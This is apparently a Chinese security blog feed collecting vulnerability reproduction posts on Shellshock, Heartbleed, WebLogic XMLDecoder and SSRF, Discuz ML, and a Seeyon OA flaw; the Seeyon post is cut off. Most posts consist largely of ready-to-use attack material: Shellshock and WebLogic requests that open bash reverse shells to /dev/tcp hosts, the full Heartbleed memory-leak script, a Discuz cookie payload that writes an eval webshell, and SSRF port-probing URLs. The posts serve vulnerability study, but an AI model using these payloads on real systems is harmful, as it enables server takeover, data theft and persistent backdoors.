      <title>【研究】Shellshock 破壳漏洞bash命令执行（CVE-2014-6271）</title>
      <link href="/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/"/>
      <url>/2019/09/03/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ebash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](【研究】Shellshock 破壳漏洞（CVE-2014-6271）)</p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>GNU Bash &lt;= 4.3</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>有两个页面<code>http://10.77.0.130:8080/victim.cgi</code>和<code>http://10.77.0.130:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。<br><img src="https://img-blog.csdnimg.cn/20190903153139661.png" alt="在这里插入图片描述"></p><p>操作：<br>访问 <a href="http://10.77.0.130:8080/victim.cgi，通过" target="_blank" rel="noopener">http://10.77.0.130:8080/victim.cgi，通过</a> Burp 截包，修改 HTTP 请求头中 UA 字段：</p><p>命令执行</p><pre><code>User-Agent: () { :;};echo ; echo; echo $(/bin/ls -al /); #列出bin目录下所有文件</code></pre><p><img src="https://img-blog.csdnimg.cn/20190903155958866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反弹 Shell 到 ip 8888端口:<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&1;</p><p>完整的请求报文如下(可直接复制到 Burp 下重放)：</p><p>GET /victim.cgi HTTP/1.1<br>Host: 10.77.0.130:8080<br>User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.77.0.58/666 0&gt;&1;<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p><p><img src="https://img-blog.csdnimg.cn/201909041135113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意密码重置总结导图</title>
      <link href="/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/"/>
      <url>/2019/08/28/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%80%BB%E7%BB%93%E5%AF%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="任意密码重置总结导图"><a href="#任意密码重置总结导图" class="headerlink" title="任意密码重置总结导图"></a>任意密码重置总结导图</h2><p><img src="https://img-blog.csdnimg.cn/20190828181509356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】心脏出血漏洞</title>
      <link href="/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/28/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>2014年4月7日OpenSSL发布了安全公告，在OpenSSL1.0.1版本的心跳包模块存在严重漏洞（CVE-2014-0160）。攻击者可以通过构造特殊的数据包，直接远程读取存在漏洞的OpenSSL服务器内存中多达64KB的数据，极有可能导致网站用户帐号密码等敏感数据被非法获取。漏洞发现者甚至声称可以直接获取到证书私钥和重要的商业文档。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>OpenSSL 1.0.1f（受影响）<br>OpenSSL 1.0.1g （不受影响）<br>OpenSSL 1.0.0 branch （不受影响）<br>OpenSSL 0.9.8 branch （不受影响）</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p><a href="http://0day.websaas.com.cn/" target="_blank" rel="noopener">http://0day.websaas.com.cn/</a><br>简单的可以直接在线检测</p><p><img src="https://img-blog.csdnimg.cn/20190828161833626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试脚本</p><pre><code># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.import sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage=&apos;%prog server [options]&apos;, description=&apos;Test for SSL heartbeat vulnerability (CVE-2014-0160)&apos;)options.add_option(&apos;-p&apos;, &apos;--port&apos;, type=&apos;int&apos;, default=443, help=&apos;TCP port to test (default: 443)&apos;)def h2bin(x):    return x.replace(&apos; &apos;, &apos;&apos;).replace(&apos;\n&apos;, &apos;&apos;).decode(&apos;hex&apos;)hello = h2bin(&apos;&apos;&apos;16 03 02 00  dc 01 00 00 d8 03 02 5343 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15  00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 0000 0f 00 01 01                                  &apos;&apos;&apos;)hb = h2bin(&apos;&apos;&apos; 18 03 02 00 0301 40 00&apos;&apos;&apos;)def hexdump(s):    for b in xrange(0, len(s), 16):        lin = [c for c in s[b : b + 16]]        hxdat = &apos; &apos;.join(&apos;%02X&apos; % ord(c) for c in lin)        pdat = &apos;&apos;.join((c if 32 &lt;= ord(c) &lt;= 126 else &apos;.&apos; )for c in lin)        print &apos;  %04x: %-48s %s&apos; % (b, hxdat, pdat)    printdef recvall(s, length, timeout=5):    endtime = time.time() + timeout    rdata = &apos;&apos;    remain = length    while remain &gt; 0:        rtime = endtime - time.time()         if rtime &lt; 0:            return None        r, w, e = select.select([s], [], [], 5)        if s in r:            data = s.recv(remain)            # EOF?            if not data:                return None            rdata += data            remain -= len(data)    return rdatadef recvmsg(s):    hdr = recvall(s, 5)    if hdr is None:        print &apos;Unexpected EOF receiving record header - server closed connection&apos;        return None, None, None    typ, ver, ln = struct.unpack(&apos;&gt;BHH&apos;, hdr)    pay = recvall(s, ln, 10)    if pay is None:        print &apos;Unexpected EOF receiving record payload - server closed connection&apos;        return None, None, None    print &apos; ... received message: type = %d, ver = %04x, length = %d&apos; % (typ, ver, len(pay))    return typ, ver, paydef hit_hb(s):    s.send(hb)    while True:        typ, ver, pay = recvmsg(s)        if typ is None:            print &apos;No heartbeat response received, server likely not vulnerable&apos;            return False        if typ == 24:            print &apos;Received heartbeat response:&apos;            hexdump(pay)            if len(pay) &gt; 3:                print &apos;WARNING: server returned more data than it should - server is vulnerable!&apos;            else:                print &apos;Server processed malformed heartbeat, but did not return any extra data.&apos;            return True        if typ == 21:            print &apos;Received alert:&apos;            hexdump(pay)            print &apos;Server returned error, likely not vulnerable&apos;            return Falsedef main():    opts, args = options.parse_args()    if len(args) &lt; 1:        options.print_help()        return    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    print &apos;Connecting...&apos;    sys.stdout.flush()    s.connect((args[0], opts.port))    print &apos;Sending Client Hello...&apos;    sys.stdout.flush()    s.send(hello)    print &apos;Waiting for Server Hello...&apos;    sys.stdout.flush()    while True:        typ, ver, pay = recvmsg(s)        if typ == None:            print &apos;Server closed connection without sending Server Hello.&apos;            return        # Look for server hello done message.        if typ == 22 and ord(pay[0]) == 0x0E:            break    print &apos;Sending heartbeat request...&apos;    sys.stdout.flush()    s.send(hb)    hit_hb(s)if __name__ == &apos;__main__&apos;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础</title>
      <link href="/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="PHP代码审计基础">TOC</a></p><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img-blog.csdnimg.cn/20190311085916924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="新的改变"><a href="#新的改变" class="headerlink" title="新的改变"></a>新的改变</h2><p>论PHP常见的漏洞<br>′ 雨。 · 2015/01/14 10:08</p><p><a href="http://www.anquan.us/static/drops/papers-4544.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-4544.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](【研究】weblogic漏洞系列- ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）)</p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>   Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Oracle WebLogic Server 10.3.6.0.0版本</p><p>Oracle WebLogic Server 12.1.3.0.0版本</p><p>Oracle WebLogic Server 12.2.1.1.0版本</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>POC反弹shell<br>反弹shell的语句，需要进行编码，，否则解析XML的时候将出现格式错误</p><p><strong>注意实验环境不能只有ip 还有端口  10.77.0.130:7001</strong></p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 10.77.0.130:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 634&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.77.0.58/666 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>反弹SHell成功<br><img src="https://img-blog.csdnimg.cn/20190815164715796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问：<a href="http://your-ip:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp</a><br>写入webshell的POC<br>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt写文件。<br>文件名称为xxxx文件内容为xxxx<br>成功发送请求之后服务器会返回 500 status code。<br>需要注意的地方是头部必须加上Content-Type: text/xml请求会出错。</p><p><strong>注意实验环境不能只有ip 还有端口  10.77.0.130:7001</strong></p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;    &lt;soapenv:Header&gt;    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;     &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;    &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;    ]]&gt;    &lt;/string&gt;    &lt;/void&gt;    &lt;void method=&quot;close&quot;/&gt;    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;    &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt;    &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/2019081517241877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传路径为<a href="http://10.77.0.130:7001/bea_wls_internal/tt.jsp" target="_blank" rel="noopener">http://10.77.0.130:7001/bea_wls_internal/tt.jsp</a></p><p><img src="https://img-blog.csdnimg.cn/20190815172826461.png" alt="在这里插入图片描述"></p><p>注意实验环境不能只有ip 还有端口  10.77.0.130:7001</p><p>注意实验环境不能只有ip 还有端口  10.77.0.130:7001</p>]]></content>
      
      
      <categories>
          
          <category> weblogic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列-SSRF漏洞</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="【研究】weblogic漏洞系列-SSRF漏洞">TOC</a></p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。<br>访问<code>http://ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，直接访问</p><p><img src="https://img-blog.csdnimg.cn/20190815150021563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>payload:<br>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a></p><p>加入url</p><pre><code>http://10.77.0.130:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</code></pre><p>`</p><p>关键点是operator这个参数</p><ul><li>可访问的端口将会得到错误，访问7001端口时返回一个404的状态码。</li><li>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code></li></ul><p>存在<br><img src="https://img-blog.csdnimg.cn/20190815151338337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不存在<br><img src="https://img-blog.csdnimg.cn/20190815151345115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>内网端口探测</p><p>我们可以根据返回的不同状态信息，来判断内网的IP是否存在以及对应端口是否开放。这里有一个地方需要注意的是，需要知道目标内网网段。如果盲目的去进行网段扫描会耗费大量的时间。</p><p>实战挖掘中发现这个位置有可能会泄露内网网段。</p><p>实战存在的情况<br><img src="https://img-blog.csdnimg.cn/2019081515211894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h2><p>下一遍分开写吧，是可以的</p>]]></content>
      
      
      <categories>
          
          <category> weblogic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz Ml v3.x 前台Getshell姿势 Discuz漏洞</title>
      <link href="/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](Discuz Ml v3.x 前台Getshell姿势)</p><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。</p><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p><strong>Discuz! ML v.3.4<br>Discuz! ML v.3.3<br>Discuz! ML v.3.2</strong></p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>简而言之，通过cookie传入payload，构造好的payload被写入template文件中:</p><p>注意这是国际版的，不是国内的那种，一般要有语言选择的才行，大部分都是国外的论坛<br>类似于有这种的<br><img src="https://img-blog.csdnimg.cn/20190714182907753.png" alt="在这里插入图片描述"></p><p>问题出在  </p><pre><code>XXXX_language=</code></pre><p>测试PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;&#39;.phpinfo().&#39;;</span><br></pre></td></tr></table></figure><p>XXX自己改一下<br><img src="https://img-blog.csdnimg.cn/20190714183142897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>GO一下看结果<br><img src="https://img-blog.csdnimg.cn/20190714183208411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4-getshell-POC"><a href="#4-getshell-POC" class="headerlink" title="4.getshell POC"></a>4.getshell POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27.+file_put_contents%28%27godz.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522godz%2522%255d%29%253b%253f%253e%27%29%29.%27</span><br></pre></td></tr></table></figure><p>原始的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;.+file_put_contents(&#39;godz.php&#39;,urldecode(&#39;&lt;?php  eval($_GET[&quot;godz&quot;]);?&gt;&#39;)).&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190714183737657.png" alt="在这里插入图片描述"></p><p><strong>访问网站生成木马文件,godz.php 密码为godz</strong><br>验证木马</p><p><img src="https://img-blog.csdnimg.cn/20190714184513361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h2 id="请勿用于非法用途"><a href="#请勿用于非法用途" class="headerlink" title="请勿用于非法用途"></a>请勿用于非法用途</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA-A8系统的0day远程命令执行的实战</title>
      <link href="/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/"/>
      <url>/2019/07/03/%E8%87%B4%E8%BF%9COA-A8%E7%B3%BB%E7%BB%9F%E7%9A%840day%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="致远OA-A8系统的0day远程命令执行的实战">TOC</a></p><h2 id="1-环境是实战，漏洞已经提交，打码子处理"><a href="#1-环境是实战，漏洞已经提交，打码子处理" class="headerlink" title="1.环境是实战，漏洞已经提交，打码子处理"></a>1.环境是实战，漏洞已经提交，打码子处理</h2><h2 id="2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095"><a href="#2-详细漏洞信息和修补参考CNVD官网查看https-www-cnvd-org-cn-webinfo-show-5095" class="headerlink" title="2.详细漏洞信息和修补参考CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095"></a>2.详细漏洞信息和修补参考CNVD官网查看<a href="https://www.cnvd.org.cn/webinfo/show/5095" target="_blank" rel="noopener">https://www.cnvd.org.cn/webinfo/show/5095</a></h2><h2 id="3漏洞影响范围"><a href="#3漏洞影响范围" class="headerlink" title="3漏洞影响范围"></a>3漏洞影响范围</h2><p>漏洞影响的产品版本包括：</p><p>致远A8-V5协同管理软件 V6.1sp1</p><p>致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3</p><p>致远A8+协同管理软件V7.1</p><h2 id="4漏洞的复现"><a href="#4漏洞的复现" class="headerlink" title="4漏洞的复现"></a>4漏洞的复现</h2><p>先采集一波url，找到对应版本，这个就不细说了</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>先访问这个路径，看有没有开启远程Servlet接口暴露</p><pre><code>/seeyon/htmlofficeservlet</code></pre><p>成功反馈<br><img src="https://img-blog.csdnimg.cn/20190703150053356.png" alt="在这里插入图片描述"></p><h2 id="第二步"><a href="#第二步" class="headerlink" 